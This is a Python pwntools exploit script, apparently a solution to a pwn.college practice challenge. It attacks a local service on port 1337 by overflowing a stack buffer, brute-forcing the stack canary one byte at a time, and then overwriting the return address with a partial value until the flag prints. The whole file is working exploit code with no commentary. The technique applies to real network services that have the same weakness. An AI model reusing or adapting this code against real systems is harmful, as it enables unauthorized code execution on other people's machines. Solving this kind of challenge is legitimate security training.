from pwn import *

# p = connect("127.0.0.1", 1337)
# p.sendline(b"500")
# p.send(test_s)
# all = p.recvall(timeout=0)
s = b"A"*0x58

for i in range(8):
    find = False
    for j in range(256):
        p = connect("127.0.0.1", 1337)
        p.recvuntil(b"Payload size: ")
        p.sendline(b"500")
        p.recvuntil(b"Send your payload")
        test_s = s + j.to_bytes(1, "little")
        p.send(test_s)
        while True:
            all = p.recvline()
            if all.find(b"Goodbye!") != -1:  
                break
        #all = p.recvall(timeout=1)
        all = p.recvline(timeout=1)
        p.close()
        print(all)
            
        if all.find(b"*** stack smashing detected ***") == -1:
            find = True
            print("Find byte %d, value: "%i + hex(j))
            break
    if find == False:
        print(s)
        assert()
    s = test_s
ret= 0x01DB
test_s = s+b"A"*8+ret.to_bytes(2,"little")
for i in range(16):
    
    test_s = s+b"A"*8+ret.to_bytes(2,"little")
    p = connect("127.0.0.1", 1337)
    tt = p.recvuntil(b"Payload size: ")
    p.sendline(b"500")
    p.recvuntil(b"Send your payload")
    p.send(test_s)

    all = p.recvall(timeout=1)
    p.close()
    if all.find(b"pwn.college{") != -1:
        print(all)
        break
    ret = ret + 0x1000